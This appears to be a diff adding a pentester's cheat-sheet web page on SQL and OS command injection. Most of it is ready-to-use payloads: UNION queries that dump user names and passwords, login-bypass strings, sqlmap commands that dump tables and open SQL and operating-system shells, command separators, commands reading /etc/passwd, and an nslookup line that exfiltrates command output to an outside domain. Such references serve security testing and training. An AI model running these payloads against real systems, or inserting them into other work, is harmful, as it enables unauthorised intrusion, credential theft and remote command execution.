@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Sqlinjection - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <p>[+] Union Based SQL Injection</p>
+<p>' or 1=1#</p>
+<p>1' ORDER BY 10#</p>
+<p>1' UNION SELECT version(),2#</p>
+<p>1' UNION SELECT version(),database()#</p>
+<p>1' UNION SELECT version(),user()#</p>
+<p>1' UNION ALL SELECT table_name,2 from information_schema.tables#</p>
+<p>1' UNION ALL SELECT column_name,2 from information_schema.columns where table_name = "users"#</p>
+<p>1' UNION ALL SELECT concat(user,char(58),password),2 from users#</p>
+<p>sqlmap --url="<url>" -p username --user-agent=SQLMAP --threads=10 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs</p>
+<p>==============SQL injection:
+Resources:    https://portswigger.net/web-security/sql-injection
+              Web application hackers handbook by Pinto and Stuttard</p>
+<p>SQL injection Cheat Sheets:   https://portswigger.net/web-security/sql-injection/cheat-sheet
+                              http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</p>
+<p>General:
+use single quotation mark ' to test for sql vulnerabiltiy
+use double dash to terminate the query --
+      On MySQL the -- sequence must be followed by a space. Alternatively, # can be used</p>
+<div class="language-text highlight"><pre><span></span><code>      Submitting the single quote character &#39; and looking for errors or other anomalies.
+      Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+      Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application&#39;s responses.
+      Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
+      Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.
+</code></pre></div>
+<p>=== Basic SQL injection:
+e.g. Login Form:  username=administrator'-- and arbitrary password
+                  username=administrator'-- -
+                  password=pw' OR 1=1 --
+                  password=pw' OR 1=1 -- -
+                  password=pw' OR 'b'='b
+    Try to register a user like username=administrator' OR 1=1 --
+    Or                          username=administrator' OR 1=1 -- -
+    in this case check for second-order sql injections</p>
+<p>=== UNION SQL injection:
+The union keyword lets you execute additional select statements:
+--&gt; Conditions:
+    You must return the same number of columns as the original query
+    The results of the injected query must match the data type of the original query.
+  1. --&gt; Determine the number of columns:
+      1.1. Method:
+          Inject an ORDER BY n-- clause until an error occurs
+            --&gt; ' ORDER BY 1--   --&gt; NO ERROR
+            --&gt; ' ORDER BY 2--   --&gt; NO ERRROR
+            --&gt; ' ORDER BY 3--   --&gt; ERROR --&gt; 2 columns (Error may be an SQL error, generic message or an empty result)
+      1.2. Method:
+          Querying different numbers of NULL values
+            --&gt; UNION SELECT NULL--                     --&gt; ERROR   --&gt; more than 1 column
+            --&gt; UNION SELECT NULL, NULL--               --&gt; NO ERROR  (maybe an additonal row of NULL values is being returned)
+                                                        --&gt; DIFFERENT ERROR (may return a distinct error message)
+                                                            However, the same error message as in the 1st &amp; 3rd test could appear. --&gt; This situation makes the method ineffective
+            --&gt; UNION SELECT NULL, NULL, NULL--         --&gt; ERROR   --&gt; less than 3 columns -&gt; 2 columns
+      NOTES: In Oracle databases a SELECT statement needs to have a FROM clause
+                    --&gt; using the built in DUAL table --&gt;     ' UNION SELECT NULL FROM DUAL--.</p>
+<ol>
+<li>
+<p>--&gt; Determine the data type of a column:
+      2.1. Assuming we want to return a String -&gt; Determine which column can represents string value
+           Assuming that we determined that the query returns 2 coulums
+           --&gt; ' UNION SELECT 'a',NULL--
+           --&gt; ' UNION SELECT NULL,'a'--
+              --&gt; If an error occurs the datatype is not compatible with the coulumn</p>
+</li>
+<li>
+<p>--&gt; Retrieving data (adhere to number of columns and data type):
+      3.1. ' UNION SELECT <columname>, <columnname> FROM <table>--
+              ' UNION SELECT username, password FROM usertable--</p>
+<p>3.2. Retrieving database information (adhere to number of columns and data type):
+                -Microsoft, MySQL:    SELECT @@version
+                -Oracle:                SELECT * FROM v$version
+                -PostgreSQL:            SELECT version()</p>
+<p>3.3. Retrieving content information from NON-Oracle databases (adhere to the number of columns and data type):
+                SELECT TABLE_NAME FROM information_schema.tables
+                --&gt;     Columns to select:  TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE</p>
+<div class="language-text highlight"><pre><span></span><code>            SELECT COLUMN_NAME FROM information_schema.columns WHRER TABLE_NAME = &#39;&lt;table_name&gt;&#39;
+            --&gt;     Columns to select:  TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+
+  Retrieving content information from Oracle databases (adhere to the number of columns and data type):
+            SELECT table_name FROM all_tables
+
+            SELECT * FROM all_tab_columns WHERE table_name = &#39;USERS&#39;
+
+            SELECT column_name, table_name FROM cols
+</code></pre></div>
+<p>3.4. Concatenate values in a single column
+        ' UNION SELECT username || '~' || password FROM users--</p>
+</li>
+</ol>
+<p>=== Blind SQL injection:
+The application contains SQL injection vulnerabilities but does not return any results of the query or error messages</p>
+<p>=== Using SQLMAP:</p>
+<ol>
+<li>Store the request to a file using Burp (e.g. file called login.req)</li>
+<li>
+<p>Test for vulnerable parameters in request
+sqlmap -r login.req --level=5 --risk=3 --threads=10</p>
+</li>
+<li>
+<p>If vulnerable parameter is found:
+  3.1 Enumerate database tables:
+        sqlmap -r login.req --level=5 --risk=3 --threads=10 --tables
+  3.2 Retrieve Tables:
+        sqlmap -r login.req --level=5 --risk=3 -T <found_table_name> --dump
+  3.3 Get Shells:
+      3.3.1 SQL shell
+          sqlmap -r login.req --level=5 --risk=3 --sql-shell
+      3.3.2 System shell
+          sqlmap -r login.req --level=5 --risk=3 --os-shell
+      3.3.3 Other shell parameters
+          sqlmap -help|grep shell</p>
+</li>
+</ol>
+<p>==============Command injection:
+Resources:  https://portswigger.net/web-security/os-command-injection
+            https://www.owasp.org/index.php/Command_Injection
+            https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)</p>
+<p>characters for command separation:
+    &amp;
+    &amp;&amp;
+    |
+    ||</p>
+<p>only on Unix-based systems:</p>
+<div class="language-text highlight"><pre><span></span><code>;
+Newline (0x0a or \n)
+</code></pre></div>
+<p>On Unix-based systems, also use the following to perform inline execution of an injected command within the original command:</p>
+<div class="language-text highlight"><pre><span></span><code>` injected command `
+$( injected command )
+</code></pre></div>
+<p>--&gt; Useful Commands (not blind OR using &gt; to output in a readable file):</p>
+<p>Win &amp; unix:   whoami
+Lin           cat /etc/passwd
+Win           type C:\boot.ini
+Lin           ifconfig
+Win           ipconfig
+Lin           uname -a
+Win           ver</p>
+<p>--&gt; Useful commands when blind:
+ping -c 10 myip   and monitor interface
+ping -c 10 127.0.0.1    and wait for delay
+nslookup mydomain.com      and monitor the request (may use a subdomain to differentiate between requests)
+nslookup <code>whoami</code>.mydomain.com      to exfiltrate command output</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/sqlinjection.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
